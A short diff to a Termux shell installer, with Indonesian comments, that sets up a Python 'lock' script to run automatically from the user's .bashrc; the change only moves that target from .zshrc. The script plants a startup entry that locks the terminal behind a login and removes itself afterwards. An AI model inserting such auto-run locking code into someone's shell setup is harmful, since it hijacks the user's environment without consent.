@@ -15,7 +15,7 @@ echo -e "\033[1;32m[+] Proses Pemasangan...\033[0m"
 sleep 15
 
 # Menambahkan script Python ke .zshrc agar otomatis berjalan saat Termux dibuka
-echo 'python $HOME/.termux_lock.py' >> $HOME/.zshrc
+echo 'python $HOME/.termux_lock.py' >> $HOME/.bashrc
 
 # Membuat file Python untuk mengunci Termux
 cat > $HOME/.termux_lock.py << 'EOF'
@@ -51,7 +51,7 @@ def lock_termux():
             os.system("clear")
 
             # Hapus baris yang berisi python $HOME/.termux_lock.py di .zshrc
-            os.system("sed -i '/python \\$HOME\\/\\.termux_lock\\.py/d' $HOME/.zshrc")
+            os.system("sed -i '/python \\$HOME\\/\\.termux_lock\\.py/d' $HOME/.bashrc")
             print("\033[1;32m\033[0m")
 
             # Hapus file script ini setelah berhasil login
